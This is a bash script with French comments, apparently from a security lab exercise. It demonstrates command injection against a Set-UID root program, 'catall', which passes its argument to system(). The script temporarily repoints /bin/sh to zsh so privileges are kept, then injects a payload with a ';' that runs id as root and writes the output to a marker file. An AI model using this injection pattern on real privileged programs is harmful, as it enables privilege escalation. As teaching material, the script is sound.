#!/bin/bash
# T4 / E6a - Injection de commande
#
# catall construit la commande "/bin/cat <argument>" et la passe a
# system(), qui l'execute via /bin/sh -c. En placant un ';' dans
# l'argument, on fait executer une seconde commande arbitraire avec le
# privilege du processus (root, car catall est Set-UID root).
set -e

LAB_DIR="$(cd "$(dirname "$0")/../../Labsetup" && pwd)"
cd "$LAB_DIR"

MARKER=/tmp/pwned_t4.txt
rm -f "$MARKER"

echo "=== Utilisateur invoquant ==="
whoami

echo
echo "=== Permissions de catall ==="
ls -l ./catall

echo
# On utilise zsh car il ne va pas enlever les privileges obtenus par un 
# program SetUID 
echo "=== Installation de zsh si absent ==="
if ! command -v zsh >/dev/null 2>&1; then
    sudo apt-get update -qq
    sudo apt-get install -y zsh
fi
 
echo
echo "=== Sauvegarde de la cible actuelle de /bin/sh ==="
ORIGINAL_SH_TARGET=$(readlink -f /bin/sh)
echo "/bin/sh pointe actuellement vers: $ORIGINAL_SH_TARGET"
 
echo
echo "=== Repointage temporaire de /bin/sh vers zsh ==="
sudo ln -sf /bin/zsh /bin/sh
ls -l /bin/sh
 
restore_sh() {
    echo
    echo "=== Restauration de /bin/sh -> $ORIGINAL_SH_TARGET ==="
    sudo ln -sf "$ORIGINAL_SH_TARGET" /bin/sh
    ls -l /bin/sh
}
trap restore_sh EXIT

echo
echo "=== Charge utile injectee ==="
PAYLOAD="x; /usr/bin/id > $MARKER; echo injection-reussie #"

echo "$PAYLOAD"

echo
echo "=== Execution ==="
./catall "$PAYLOAD"

echo
echo "=== Contenu de $MARKER (cree par la commande injectee) ==="
if [ -f "$MARKER" ]; then
    cat "$MARKER"
    echo
    echo "--> La commande injectee s'est bien executee."
    echo "    L'identite affichee permet de verifier le privilege effectif"
    echo "    dont elle dispose."
    rm -f "$MARKER"

else
    echo "ECHEC : le fichier marqueur n'a pas ete cree."
fi